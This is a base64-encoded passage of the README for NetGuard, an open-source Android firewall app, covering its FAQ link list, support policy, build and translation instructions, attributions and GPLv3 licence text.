aXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3Vz
ZXItY29udGVudC1mYXEwKQoKPGEgbmFtZT0iRkFRMSI+PC9hPgpbKiooMSkg
Q2FuIE5ldEd1YXJkIGNvbXBsZXRlbHkgcHJvdGVjdCBteSBwcml2YWN5Pyoq
XShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rl
ci9GQVEubWQjdXNlci1jb250ZW50LWZhcTEpCgo8YSBuYW1lPSJGQVEyIj48
L2E+ClsqKigyKSBDYW4gSSB1c2UgYW5vdGhlciBWUE4gYXBwbGljYXRpb24g
d2hpbGUgdXNpbmcgTmV0R3VhcmQ/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9N
NjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQt
ZmFxMikKCjxhIG5hbWU9IkZBUTMiPjwvYT4KWyoqKDMpIENhbiBJIHVzZSBO
ZXRHdWFyZCBvbiBhbnkgQW5kcm9pZCB2ZXJzaW9uPyoqXShodHRwczovL2dp
dGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNl
ci1jb250ZW50LWZhcTMpCgo8YSBuYW1lPSJGQVE0Ij48L2E+ClsqKig0KSBX
aWxsIE5ldEd1YXJkIHVzZSBleHRyYSBiYXR0ZXJ5IHBvd2VyPyoqXShodHRw
czovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEu
bWQjdXNlci1jb250ZW50LWZhcTQpCgo8YSBuYW1lPSJGQVE2Ij48L2E+Clsq
Kig2KSBXaWxsIE5ldEd1YXJkIHNlbmQgbXkgaW50ZXJuZXQgdHJhZmZpYyB0
byBhbiBleHRlcm5hbCAoVlBOKSBzZXJ2ZXI/KipdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNv
bnRlbnQtZmFxNikKCjxhIG5hbWU9IkZBUTciPjwvYT4KWyoqKDcpIFdoeSBh
cmUgYXBwbGljYXRpb25zIHdpdGhvdXQgaW50ZXJuZXQgcGVybWlzc2lvbiBz
aG93bj8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxv
Yi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXE3KQoKPGEgbmFtZT0i
RkFROCI+PC9hPgpbKiooOCkgV2hhdCBkbyBJIG5lZWQgdG8gZW5hYmxlIGZv
ciB0aGUgR29vZ2xlIFBsYXnihKIgc3RvcmUgYXBwIHRvIHdvcms/KipdKGh0
dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZB
US5tZCN1c2VyLWNvbnRlbnQtZmFxOCkKCjxhIG5hbWU9IkZBUTkiPjwvYT4K
WyoqKDkpIFdoeSBpcyB0aGUgVlBOIHNlcnZpY2UgYmVpbmcgcmVzdGFydGVk
PyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21h
c3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTkpCgo8YSBuYW1lPSJGQVEx
MCI+PC9hPgpbKiooMTApIFdpbGwgeW91IHByb3ZpZGUgYSBUYXNrZXIgcGx1
Zy1pbj8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxv
Yi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXExMCkKCjxhIG5hbWU9
IkZBUTEzIj48L2E+ClsqKigxMykgSG93IGNhbiBJIHJlbW92ZSB0aGUgb25n
b2luZyBOZXRHdWFyZCBlbnRyeSBpbiB0aGUgbm90aWZpY2F0aW9uIHNjcmVl
bj8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXExMykKCjxhIG5hbWU9IkZB
UTE0Ij48L2E+ClsqKigxNCkgV2h5IGNhbid0IEkgc2VsZWN0IE9LIHRvIGFw
cHJvdmUgdGhlIFZQTiBjb25uZWN0aW9uIHJlcXVlc3Q/KipdKGh0dHBzOi8v
Z2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1
c2VyLWNvbnRlbnQtZmFxMTQpCgo8YSBuYW1lPSJGQVExNSI+PC9hPgpbKioo
MTUpIEFyZSBGLURyb2lkIGJ1aWxkcyBzdXBwb3J0ZWQ/KipdKGh0dHBzOi8v
Z2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1
c2VyLWNvbnRlbnQtZmFxMTUpCgo8YSBuYW1lPSJGQVExNiI+PC9hPgpbKioo
MTYpIFdoeSBhcmUgc29tZSBhcHBsaWNhdGlvbnMgc2hvd24gZGltbWVkPyoq
XShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rl
ci9GQVEubWQjdXNlci1jb250ZW50LWZhcTE2KQoKPGEgbmFtZT0iRkFRMTci
PjwvYT4KWyoqKDE3KSBXaHkgaXMgTmV0R3VhcmQgdXNpbmcgc28gbXVjaCBt
ZW1vcnk/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Js
b2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMTcpCgo8YSBuYW1l
PSJGQVExOCI+PC9hPgpbKiooMTgpIFdoeSBjYW4ndCBJIGZpbmQgTmV0R3Vh
cmQgaW4gdGhlIEdvb2dsZSBQbGF54oSiIHN0b3JlIGFwcD8qKl0oaHR0cHM6
Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1k
I3VzZXItY29udGVudC1mYXExOCkKCjxhIG5hbWU9IkZBUTE5Ij48L2E+Clsq
KigxOSkgV2h5IGRvZXMgYXBwbGljYXRpb24gWFlaIHN0aWxsIGhhdmUgaW50
ZXJuZXQgYWNjZXNzPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRH
dWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTE5KQoK
PGEgbmFtZT0iRkFRMjAiPjwvYT4KWyoqKDIwKSBDYW4gSSBHcmVlbmlmeS9o
aWJlcm5hdGUgTmV0R3VhcmQ/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZC
L05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFx
MjApCgo8YSBuYW1lPSJGQVEyMSI+PC9hPgpbKiooMjEpIERvZXMgZG96ZSBt
b2RlIGFmZmVjdCBOZXRHdWFyZD8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXEyMSkKCjxhIG5hbWU9IkZBUTIyIj48L2E+ClsqKigyMikgQ2FuIEkgdGV0
aGVyICh1c2UgdGhlIEFuZHJvaWQgaG90c3BvdCkgLyB1c2UgV2ktRmkgY2Fs
bGluZyB3aGlsZSB1c2luZyBOZXRHdWFyZD8qKl0oaHR0cHM6Ly9naXRodWIu
Y29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29u
dGVudC1mYXEyMikKCjxhIG5hbWU9IkZBUTI0Ij48L2E+ClsqKigyNCkgQ2Fu
IHlvdSByZW1vdmUgdGhlIG5vdGlmaWNhdGlvbiBmcm9tIHRoZSBzdGF0dXMg
YmFyPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9i
L21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTI0KQoKPGEgbmFtZT0i
RkFRMjUiPjwvYT4KWyoqKDI1KSBDYW4geW91IGFkZCBhICdzZWxlY3QgYWxs
Jz8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyNSkKCjxhIG5hbWU9IkZB
UTI3Ij48L2E+ClsqKigyNykgSG93IGRvIEkgcmVhZCB0aGUgYmxvY2tlZCB0
cmFmZmljIGxvZz8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3Vh
cmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyNykKCjxh
IG5hbWU9IkZBUTI4Ij48L2E+ClsqKigyOCkgV2h5IGlzIEdvb2dsZSBjb25u
ZWN0aXZpdHkgc2VydmljZXMgYWxsb3dlZCBpbnRlcm5ldCBhY2Nlc3MgYnkg
ZGVmYXVsdD8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQv
YmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyOCkKCjxhIG5h
bWU9IkZBUTI5Ij48L2E+ClsqKigyOSkgV2h5IGRvIEkgZ2V0ICdUaGUgaXRl
bSB5b3UgcmVxdWVzdGVkIGlzIG5vdCBhdmFpbGFibGUgZm9yIHB1cmNoYXNl
Jz8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEyOSkKCjxhIG5hbWU9IkZB
UTMwIj48L2E+ClsqKigzMCkgQ2FuIEkgYWxzbyBydW4gQUZXYWxsKyBvbiB0
aGUgc2FtZSBkZXZpY2U/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05l
dEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzAp
Cgo8YSBuYW1lPSJGQVEzMSI+PC9hPgpbKiooMzEpIFdoeSBjYW4gc29tZSBh
cHBsaWNhdGlvbnMgYmUgY29uZmlndXJlZCBhcyBhIGdyb3VwIG9ubHk/Kipd
KGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVy
L0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzEpCgo8YSBuYW1lPSJGQVEzMiI+
PC9hPgpbKiooMzIpIFdoeSBpcyB0aGUgYmF0dGVyeS9uZXR3b3JrIHVzYWdl
IG9mIE5ldEd1YXJkIHNvIGhpZ2gqKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXEzMikKCjxhIG5hbWU9IkZBUTMzIj48L2E+ClsqKigzMykgQ2FuIHlvdSBh
ZGQgcHJvZmlsZXM/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1
YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzMpCgo8
YSBuYW1lPSJGQVEzNCI+PC9hPgpbKiooMzQpIENhbiB5b3UgYWRkIHRoZSBj
b25kaXRpb24gJ3doZW4gb24gZm9yZWdyb3VuZCc/KipdKGh0dHBzOi8vZ2l0
aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2Vy
LWNvbnRlbnQtZmFxMzQpCgo8YSBuYW1lPSJGQVEzNSI+PC9hPgpbKiooMzUp
IFdoeSBkb2VzIHRoZSBWUE4gbm90IHN0YXJ0PyoqXShodHRwczovL2dpdGh1
Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1j
b250ZW50LWZhcTM1KQoKPGEgbmFtZT0iRkFRMzYiPjwvYT4KWyoqKDM2KSBD
YW4geW91IGFkZCBQSU4gb3IgcGFzc3dvcmQgcHJvdGVjdGlvbj8qKl0oaHR0
cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFR
Lm1kI3VzZXItY29udGVudC1mYXEzNikKCjxhIG5hbWU9IkZBUTM3Ij48L2E+
ClsqKigzNykgV2h5IGFyZSB0aGUgcHJvIGZlYXR1cmVzIHNvIGV4cGVuc2l2
ZT8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9t
YXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1mYXEzNykKCjxhIG5hbWU9IkZB
UTM4Ij48L2E+ClsqKigzOCkgV2h5IGRpZCBOZXRHdWFyZCBzdG9wIHJ1bm5p
bmc/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2Iv
bWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzgpCgo8YSBuYW1lPSJG
QVEzOSI+PC9hPgpbKiooMzkpIEhvdyBkb2VzIGEgVlBOIGJhc2VkIGZpcmV3
YWxsIGRpZmZlciBmcm9tIGEgaXB0YWJsZXMgYmFzZWQgZmlyZXdhbGw/Kipd
KGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVy
L0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFxMzkpCgo8YSBuYW1lPSJGQVE0MCI+
PC9hPgpbKiooNDApIENhbiB5b3UgYWRkIHNjaGVkdWxlcz8qKl0oaHR0cHM6
Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1k
I3VzZXItY29udGVudC1mYXE0MCkKCjxhIG5hbWU9IkZBUTQxIj48L2E+Clsq
Kig0MSkgQ2FuIHlvdSBhZGQgd2lsZGNhcmRzPyoqXShodHRwczovL2dpdGh1
Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1j
b250ZW50LWZhcTQxKQoKPGEgbmFtZT0iRkFRNDIiPjwvYT4KWyoqKDQyKSBX
aHkgaXMgcGVybWlzc2lvbiAuLi4gbmVlZGVkPyoqXShodHRwczovL2dpdGh1
Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1j
b250ZW50LWZhcTQyKQoKPGEgbmFtZT0iRkFRNDMiPjwvYT4KWyoqKDQzKSBJ
IGdldCAnVGhpcyBhcHAgaXMgY2F1c2luZyB5b3VyIGRldmljZSB0byBydW4g
c2xvd2x5JyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9i
bG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQzKQoKPGEgbmFt
ZT0iRkFRNDQiPjwvYT4KWyoqKDQ0KSBJIGRvbid0IGdldCBub3RpZmljYXRp
b25zIG9uIGFjY2VzcyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRH
dWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQ0KQoK
PGEgbmFtZT0iRkFRNDUiPjwvYT4KWyoqKDQ1KSBEb2VzIE5ldEd1YXJkIGhh
bmRsZSBpbmNvbWluZyBjb25uZWN0aW9ucz8qKl0oaHR0cHM6Ly9naXRodWIu
Y29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29u
dGVudC1mYXE0NSkKCjxhIG5hbWU9IkZBUTQ2Ij48L2E+ClsqKig0NikgQ2Fu
IEkgZ2V0IGEgcmVmdW5kPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9O
ZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQ2
KQoKPGEgbmFtZT0iRkFRNDciPjwvYT4KWyoqKDQ3KSBXaHkgYXJlIHRoZXJl
IGluIGFwcGxpY2F0aW9uIGFkdmVydGlzZW1lbnRzPyoqXShodHRwczovL2dp
dGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNl
ci1jb250ZW50LWZhcTQ3KQoKPGEgbmFtZT0iRkFRNDgiPjwvYT4KWyoqKDQ4
KSBXaHkgYXJlIHNvbWUgZG9tYWluIG5hbWVzIGJsb2NrZWQgd2hpbGUgdGhl
eSBhcmUgc2V0IHRvIGJlIGFsbG93ZWQ/KipdKGh0dHBzOi8vZ2l0aHViLmNv
bS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRl
bnQtZmFxNDgpCgo8YSBuYW1lPSJGQVE0OSI+PC9hPgpbKiooNDkpIERvZXMg
TmV0R3VhcmQgZW5jcnlwdCBteSBpbnRlcm5ldCB0cmFmZmljIC8gaGlkZSBt
eSBJUCBhZGRyZXNzPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRH
dWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTQ5KQoK
PGEgbmFtZT0iRkFRNTAiPjwvYT4KWyoqKDUwKSBXaWxsIE5ldEd1YXJkIGF1
dG9tYXRpY2FsbHkgc3RhcnQgb24gYm9vdD8qKl0oaHR0cHM6Ly9naXRodWIu
Y29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29u
dGVudC1mYXE1MCkKCjxhIG5hbWU9IkZBUTUxIj48L2E+ClsqKig1MSkgTmV0
R3VhcmQgYmxvY2tzIGFsbCBpbnRlcm5ldCB0cmFmZmljISoqXShodHRwczov
L2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQj
dXNlci1jb250ZW50LWZhcTUxKQoKPGEgbmFtZT0iRkFRNTIiPjwvYT4KWyoq
KDUyKSBXaGF0IGlzIGxvY2tkb3duIG1vZGU/KipdKGh0dHBzOi8vZ2l0aHVi
LmNvbS9NNjZCL05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNv
bnRlbnQtZmFxNTIpCgo8YSBuYW1lPSJGQVE1MyI+PC9hPgpbKiooNTMpIFRo
ZSB0cmFuc2xhdGlvbiBpbiBteSBsYW5ndWFnZSBpcyBtaXNzaW5nIC8gaW5j
b3JyZWN0IC8gaW5jb21wbGV0ZSEqKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXE1MykKCjxhIG5hbWU9IkZBUTU0Ij48L2E+ClsqKig1NCkgSG93IHRvIHR1
bm5lbCBhbGwgVENQIGNvbm5lY3Rpb25zIHRocm91Z2ggdGhlIFRvciBuZXR3
b3JrPyoqXShodHRwczovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9i
L21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50LWZhcTU0KQoKPGEgbmFtZT0i
RkFRNTUiPjwvYT4KWyoqKDU1KSBXaHkgZG9lcyBOZXRHdWFyZCBjb25uZWN0
IHRvIEFtYXpvbiAvIGlwaW5mby5pbz8qKl0oaHR0cHM6Ly9naXRodWIuY29t
L002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVu
dC1mYXE1NSkKCjxhIG5hbWU9IkZBUTU2Ij48L2E+ClsqKig1NikgTmV0R3Vh
cmQgYWxsb3dzIGFsbCBpbnRlcm5ldCB0cmFmZmljISoqXShodHRwczovL2dp
dGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNl
ci1jb250ZW50LWZhcTU2KQoKPGEgbmFtZT0iRkFRNTciPjwvYT4KWyoqKDU3
KSBXaHkgZG9lcyBOZXRHdWFyZCB1c2Ugc28gbXVjaCBkYXRhPyoqXShodHRw
czovL2dpdGh1Yi5jb20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEu
bWQjdXNlci1jb250ZW50LWZhcTU3KQoKPGEgbmFtZT0iRkFRNTgiPjwvYT4K
WyoqKDU4KSBXaHkgZG9lcyBsb2FkaW5nIHRoZSBhcHBsaWNhdGlvbiBsaXN0
IHRha2UgYSBsb25nIHRpbWU/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZC
L05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFx
NTgpCgo8YSBuYW1lPSJGQVE1OSI+PC9hPgpbKiooNTkpIENhbiB5b3UgaGVs
cCBtZSByZXN0b3JlIG15IHB1cmNoYXNlPyoqXShodHRwczovL2dpdGh1Yi5j
b20vTTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250
ZW50LWZhcTU5KQoKPGEgbmFtZT0iRkFRNjAiPjwvYT4KWyoqKDYwKSBXaHkg
ZG9lcyBJUCAoV2ktRmkpIGNhbGxpbmcvU01TL01NUyBub3Qgd29yaz8qKl0o
aHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIv
RkFRLm1kI3VzZXItY29udGVudC1mYXE2MCkKCjxhIG5hbWU9IkZBUTYxIj48
L2E+ClsqKig2MSkgSGVscCwgTmV0R3VhcmQgY3Jhc2hlZCEqKl0oaHR0cHM6
Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1k
I3VzZXItY29udGVudC1mYXE2MSkKCjxhIG5hbWU9IkZBUTYyIj48L2E+Clsq
Kig2MikgSG93IGNhbiBJIHNvbHZlICdUaGVyZSB3YXMgYSBwcm9ibGVtIHBh
cnNpbmcgdGhlIHBhY2thZ2UnID8qKl0oaHR0cHM6Ly9naXRodWIuY29tL002
NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVudC1m
YXE2MikKCjxhIG5hbWU9IkZBUTYzIj48L2E+ClsqKig2MykgV2h5IGlzIGFs
bCBETlMgdHJhZmZpYyBhbGxvd2VkPyoqXShodHRwczovL2dpdGh1Yi5jb20v
TTY2Qi9OZXRHdWFyZC9ibG9iL21hc3Rlci9GQVEubWQjdXNlci1jb250ZW50
LWZhcTYzKQoKPGEgbmFtZT0iRkFRNjQiPjwvYT4KWyoqKDY0KSBDYW4geW91
IGFkZCBETlMgb3ZlciBUTFM/KipdKGh0dHBzOi8vZ2l0aHViLmNvbS9NNjZC
L05ldEd1YXJkL2Jsb2IvbWFzdGVyL0ZBUS5tZCN1c2VyLWNvbnRlbnQtZmFx
NjQpCgo8YSBuYW1lPSJGQVE2NSI+PC9hPgpbKiooNjUpIFdoeSBjYW4gTmV0
R3VhcmQgbm90IGJsb2NrIGl0c2VsZj8qKl0oaHR0cHM6Ly9naXRodWIuY29t
L002NkIvTmV0R3VhcmQvYmxvYi9tYXN0ZXIvRkFRLm1kI3VzZXItY29udGVu
dC1mYXE2NSkKClN1cHBvcnQKLS0tLS0tLQoKRm9yIHF1ZXN0aW9ucywgZmVh
dHVyZSByZXF1ZXN0cyBhbmQgYnVnIHJlcG9ydHMsIHBsZWFzZSBbdXNlIHRo
aXMgWERBLURldmVsb3BlcnMgZm9ydW0gdGhyZWFkXShodHRwOi8vZm9ydW0u
eGRhLWRldmVsb3BlcnMuY29tL3Nob3d0aHJlYWQucGhwP3Q9MzIzMzAxMiku
CgpUaGVyZSBpcyBzdXBwb3J0IG9uIHRoZSBsYXRlc3QgdmVyc2lvbiBvZiBO
ZXRHdWFyZCBvbmx5LgoKVGhlcmUgaXMgbm8gc3VwcG9ydCBvbiB0aGluZ3Mg
dGhhdCBhcmUgbm90IGRpcmVjdGx5IHJlbGF0ZWQgdG8gTmV0R3VhcmQuCgpU
aGVyZSBpcyBubyBzdXBwb3J0IG9uIGJ1aWxkaW5nIGFuZCBkZXZlbG9waW5n
IHRoaW5ncyBieSB5b3Vyc2VsZi4KCioqTmV0R3VhcmQgaXMgc3VwcG9ydGVk
IGZvciBwaG9uZXMgYW5kIHRhYmxldHMgb25seSwgc28gbm90IGZvciBvdGhl
ciBkZXZpY2UgdHlwZXMgbGlrZSBvbiBhIHRlbGV2aXNpb24gb3IgaW4gYSBj
YXIuKioKCkNvbnRyaWJ1dGluZwotLS0tLS0tLS0tLS0KCipCdWlsZGluZyoK
CkJ1aWxkaW5nIGlzIHNpbXBsZSwgaWYgeW91IGluc3RhbGwgdGhlIHJpZ2h0
IHRvb2xzOgoKKiBbQW5kcm9pZCBTdHVkaW9dKGh0dHA6Ly9kZXZlbG9wZXIu
YW5kcm9pZC5jb20vc2RrLykKKiBbQW5kcm9pZCBOREtdKGh0dHA6Ly9kZXZl
bG9wZXIuYW5kcm9pZC5jb20vdG9vbHMvc2RrL25kay8pCgpUaGUgbmF0aXZl
IGNvZGUgaXMgYnVpbHQgYXMgcGFydCBvZiB0aGUgQW5kcm9pZCBTdHVkaW8g
cHJvamVjdC4KCkl0IGlzIGV4cGVjdGVkIHRoYXQgeW91IGNhbiBzb2x2ZSBi
dWlsZCBwcm9ibGVtcyB5b3Vyc2VsZiwgc28gdGhlcmUgaXMgbm8gc3VwcG9y
dCBvbiBidWlsZGluZy4KSWYgeW91IGNhbm5vdCBidWlsZCB5b3Vyc2VsZiwg
dGhlcmUgYXJlIHByZWJ1aWx0IHZlcnNpb25zIG9mIE5ldEd1YXJkIGF2YWls
YWJsZSBbaGVyZV0oaHR0cHM6Ly9naXRodWIuY29tL002NkIvTmV0R3VhcmQv
cmVsZWFzZXMpLgoKKlRyYW5zbGF0aW5nKgoKKiBUcmFuc2xhdGlvbnMgdG8g
b3RoZXIgbGFuZ3VhZ2VzIGFyZSB3ZWxjb21lZAoqIFlvdSBjYW4gdHJhbnNs
YXRlIG9ubGluZSBbaGVyZV0oaHR0cHM6Ly9jcm93ZGluLmNvbS9wcm9qZWN0
L25ldGd1YXJkLykKKiBJZiB5b3VyIGxhbmd1YWdlIGlzIG5vdCBsaXN0ZWQs
IHBsZWFzZSBzZW5kIGEgbWVzc2FnZSB0byBtYXJjZWwocGx1cyluZXRndWFy
ZChhdClmYWlyY29kZShkb3QpZXUKKiBZb3UgY2FuIHNlZSB0aGUgc3RhdHVz
IG9mIGFsbCB0cmFuc2xhdGlvbnMgW2hlcmVdKGh0dHBzOi8vY3Jvd2Rpbi5j
b20vcHJvamVjdC9uZXRndWFyZCkuCgpQbGVhc2Ugbm90ZSB0aGF0IGJ5IGNv
bnRyaWJ1dGluZyB5b3UgYWdyZWUgdG8gdGhlIGxpY2Vuc2UgYmVsb3csIGlu
Y2x1ZGluZyB0aGUgY29weXJpZ2h0LCB3aXRob3V0IGFueSBhZGRpdGlvbmFs
IHRlcm1zIG9yIGNvbmRpdGlvbnMuCgpBdHRyaWJ1dGlvbgotLS0tLS0tLS0t
LQoKTmV0R3VhcmQgdXNlczoKCiogW0dsaWRlXShodHRwczovL2J1bXB0ZWNo
LmdpdGh1Yi5pby9nbGlkZS8pCiogW0FuZHJvaWQgU3VwcG9ydCBMaWJyYXJ5
XShodHRwczovL2RldmVsb3Blci5hbmRyb2lkLmNvbS90b29scy9zdXBwb3J0
LWxpYnJhcnkvKQoKTGljZW5zZQotLS0tLS0tCgpbR05VIEdlbmVyYWwgUHVi
bGljIExpY2Vuc2UgdmVyc2lvbiAzXShodHRwOi8vd3d3LmdudS5vcmcvbGlj
ZW5zZXMvZ3BsLnR4dCkKCkNvcHlyaWdodCAoYykgMjAxNS0yMDE4IE1hcmNl
bCBCb2tob3JzdCAoW002NkJdKGh0dHBzOi8vY29udGFjdC5mYWlyY29kZS5l
dS8pKQoKQWxsIHJpZ2h0cyByZXNlcnZlZAoKVGhpcyBmaWxlIGlzIHBhcnQg
b2YgTmV0R3VhcmQuCgpOZXRHdWFyZCBpcyBmcmVlIHNvZnR3YXJlOiB5b3Ug
Y2FuIHJlZGlzdHJpYnV0ZSBpdCBhbmQvb3IgbW9kaWZ5Cml0IHVuZGVyIHRo
ZSB0ZXJtcyBvZiB0aGUgR05VIEdlbmVyYWwgUHVibGljIExpY2Vuc2UgYXMg
cHVibGlzaGVkIGJ5CnRoZSBGcmVlIFNvZnR3YXJlIEZvdW5kYXRpb24sIGVp
dGhlciB2ZXJzaW9uIDMgb2YgdGhlIExpY2Vuc2UsIG9yCihhdCB5b3VyIGRp
c2NyZXRpb24pIGFueSBsYXRlciB2ZXJzaW9uLgoKTmV0R3VhcmQgaXMgZGlz
dHJpYnV0ZWQgaW4gdGhlIGhvcGUgdGhhdCBpdCB3aWxsIGJlIHVzZWZ1bCwK
YnV0IFdJVEhPVVQgQU5ZIFdBUlJBTlRZOyB3aXRob3V0IGV2ZW4gdGhlIGlt
cGxpZWQgd2FycmFudHkgb2YKTUVSQ0hBTlRBQklMSVRZIG9yIEZJVE5FU1Mg
Rk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFLiAgU2VlIHRoZQpHTlUgR2VuZXJh
bCBQdWJsaWMgTGljZW5zZSBmb3IgbW9yZSBkZXRhaWxzLgoKWW91IHNob3Vs
ZCBoYXZlIHJlY2VpdmVkIGEgY29weSBvZiB0aGUgR05VIEdlbmVyYWwgUHVi
